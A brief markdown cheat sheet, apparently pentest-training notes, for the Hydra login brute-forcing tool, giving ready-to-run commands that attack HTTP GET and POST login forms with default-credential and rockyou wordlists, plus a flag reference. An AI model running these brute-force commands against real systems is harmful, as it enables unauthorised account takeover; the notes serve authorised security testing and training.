# [Hydra](https://github.com/vanhauser-thc/thc-hydra)
***
#### Hydra is a reliable tool for Login Brute Forcing. It can fuzz any pair of credentials and perform a fast verification of success. 

### Installation
```shell
$ apt install hydra -y
```

### Example: Login Brute Force using Default Credentials wordlist
```shell
$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 170.111.111.2 -s 1337 http-get /
```

### Example using one wordlist for username and password
```shell
$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 170.111.111.2 -s 1337 http-get /
```

### Example login form with known username
```shell
$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```



### Useful flags
* -C : Specify Wordlist
* SERVER_IP : Target IP
* -s PORT   : Target Port
* http-<METHOD> : Specify request Method
* /          : Target Path
* -L/-l        : Specify Usernames wordlist / static username
* -P/-p        : Specify Passwords wordlist / static password
* -f        : Stop after successful login
* -u        : Try all users on each password, instead of all passwords in one user
* -t        : Specify number of threads


